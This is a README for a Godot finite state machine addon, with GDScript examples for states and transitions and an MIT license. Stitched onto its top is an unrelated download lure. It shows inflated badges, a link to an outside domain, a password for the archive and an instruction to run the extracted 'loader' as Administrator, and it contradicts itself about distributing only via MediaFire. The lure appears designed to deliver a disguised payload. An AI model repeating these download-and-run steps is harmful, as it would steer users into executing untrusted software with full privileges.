<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Finite State Machine

## Creating State Machine

To create the State Machine, simply create a new State Machine Node.

> [!NOTE]
> To make a starting State for the State Machine, select the State Machine and change the Initial State property.

## Creating a State

To create a new State, create a script similiar to this...

```gdscript
extends State
class_name STATE_NAME # Your state's name

# Runs when the state is entered
func enter():
    pass

# Runs when the state is exited
func exit():
    pass

# Updates every _process() update (When state is active)
func update():
    pass

# Updates every _physics_process() update (When state is active)
func physics_update():
    pass
```

> [!WARNING]
> If you do not specify a class name for your state, you will be unable to create a node of the State.

To add the State to the State Machine, create a new Node of the State you just made, and add it as a child of the State Machine.

## Transitioning to other States

To transition to other States on the State Machine, make sure there are more than one State as a child of the State Machine.

To transition to another State, you can use the `Transitioned` signal (signal inside State script)...

```gdscript
# (CURRENT_STATE, NEXT_STATE_NAME)
Transitioned.emit(self, "EnemyIdle")
```

## Checking if State is Active

If you need to check if a state is active while inside of the state, for example, inside the EnemyIdle state you are checking the `_on_area_entered():` (you might already be getting an 'Cannot change state from a non-active state') you can use the `active` boolean included inside the State class to check if the state is currently active.

```gdscript
# Instead of doing this...
func area_entered(area):
    # Code here

# Do this...
func area_entered(area):
    if active:
        # Code here
```

> [!NOTE]
> This applies to any functions that could run at anytime (such as `area_entered`, `area_exited`, etc).


---

MIT License

Copyright (c) 2024 Alec Southward

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
